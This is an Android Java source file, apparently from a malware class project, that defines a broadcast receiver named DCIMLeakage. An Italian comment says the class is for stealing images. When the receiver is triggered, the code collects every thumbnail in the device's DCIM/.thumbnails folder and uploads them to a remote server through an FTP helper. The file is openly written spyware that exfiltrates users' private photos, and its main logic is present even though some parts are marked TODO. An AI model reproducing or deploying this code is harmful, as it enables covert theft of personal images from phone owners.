package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import java.io.File;

/**
 * Permette il furto delle immagini
 * DA CONSIDERARE: immagine full-size o scalata o thumbnail?
 */
public class DCIMLeakage extends BroadcastReceiver {
    private static final String TAG = "DCIMLeakage";

    @Override
    public void onReceive(Context context, Intent intent) {

        // TODO
        Log.d(TAG, "Started");

        // call method to leake thumbnails
        thumbnailsLeakage(context);
    }

    private void thumbnailsLeakage(Context context){
        // path to .thumbnails dir
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath()
                + "/.thumbnails/";

        // thumbnails directory
        File thumbnailsDir = new File(path);

        // get all thumbnails
        File[] thumbnails = thumbnailsDir.listFiles();

        // if there are some thumbnails, start to uplaod
        if ( thumbnails!=null && thumbnails.length>0 ){

            // TODO

            // get a FTP client
            FTP ftp = new FTP(context);
            // start upload
            ftp.upload(thumbnails, "DCIM");
        }
    }

}
